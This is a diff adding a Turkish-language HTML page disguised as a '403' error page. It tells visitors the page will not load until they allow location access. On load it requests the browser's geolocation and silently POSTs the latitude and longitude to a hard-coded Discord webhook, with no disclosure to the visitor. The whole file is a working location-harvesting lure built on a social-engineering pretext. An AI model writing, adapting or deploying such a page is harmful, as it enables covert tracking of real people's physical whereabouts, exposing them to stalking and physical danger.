@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+	
+    <style>
+        body {
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .error-code {
+            font-size: 72px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            font-size: 24px;
+            color: #555;
+            margin-bottom: 40px;
+        }
+
+        .instructions {
+            font-size: 16px;
+            color: #777;
+        }
+    </style>
+	
+	
+  
+</head>
+<body onload="checkGeolocationSupport()">
+	<div class="container">
+        <h1 class="error-code">403</h1>
+        <h2 class="error-message">Lokasyon Erişime İzin Reddedildiği İçin Sayfa Yüklenmiyor. Sayfayı yenileyiniz.</h2>
+        <p class="instructions">Lütfen tarayıcınızın ayarlarında lokasyon erişimine izin verdiğinizden emin olun.</p>
+    </div>
+	
+	<script>
+		function checkGeolocationSupport() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition, showError);
+			} else {
+				alert("Tarayıcınız konum izleme özelliğini desteklemiyor!");
+			}
+		}
+
+		function showPosition(position) {
+			var latitude = position.coords.latitude;
+			var longitude = position.coords.longitude;
+
+			var webhookURL = "https://discord.com/api/webhooks/1102118489063436298/o4iQIrgeJNAoo2NmPBhhXouiTjJcviL_AxNhtszm413wNZipPYYqg9eZlnayeu00cRAI";
+			var payload = {
+				content: "> **Konum:** Enlem: " + latitude + ", Boylam: " + longitude
+			};
+
+			fetch(webhookURL, {
+				method: "POST",
+				headers: {
+					"Content-Type": "application/json"
+				},
+				body: JSON.stringify(payload)
+			})
+				.then(response => {
+					if (response.ok) {
+						console.log("Konum başarıyla gönderildi.");
+					} else {
+						console.error("Konum gönderilirken bir hata oluştu.");
+					}
+				})
+				.catch(error => {
+					console.error("Konum gönderilirken bir hata oluştu:", error);
+				});
+		}
+
+		function showError(error) {
+			switch (error.code) {
+				case error.PERMISSION_DENIED:
+					alert("Konum izni reddedildi. Sayfa yüklenemiyor.");
+					window.stop(); // Sayfa yüklenmesini durdur
+					break;
+				case error.POSITION_UNAVAILABLE:
+					alert("Konum bilgisi kullanılamıyor. Sayfa yüklenemiyor.");
+					break;
+				case error.TIMEOUT:
+					alert("Konum alımı zaman aşımına uğradı. Sayfa yüklenemiyor.");
+					break;
+				case error.UNKNOWN_ERROR:
+					alert("Bilinmeyen bir hata oluştu. Sayfa yüklenemiyor.");
+					break;
+			}
+		}
+	</script>
+  
+  
+</body>
+</html>
